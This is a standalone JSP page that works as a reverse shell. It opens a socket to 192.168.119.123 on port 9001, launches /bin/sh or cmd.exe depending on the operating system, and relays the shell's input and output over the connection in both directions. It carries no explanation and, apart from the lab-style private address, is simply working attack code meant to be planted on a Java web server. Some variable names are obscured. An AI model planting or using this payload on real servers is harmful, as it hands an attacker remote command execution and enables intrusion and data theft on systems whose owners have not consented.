<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream yL;
    OutputStream fj;

    StreamConnector( InputStream yL, OutputStream fj )
    {
      this.yL = yL;
      this.fj = fj;
    }

    public void run()
    {
      BufferedReader m4  = null;
      BufferedWriter dud = null;
      try
      {
        m4  = new BufferedReader( new InputStreamReader( this.yL ) );
        dud = new BufferedWriter( new OutputStreamWriter( this.fj ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = m4.read( buffer, 0, buffer.length ) ) > 0 )
        {
          dud.write( buffer, 0, length );
          dud.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( m4 != null )
          m4.close();
        if( dud != null )
          dud.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "192.168.119.123", 9001 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
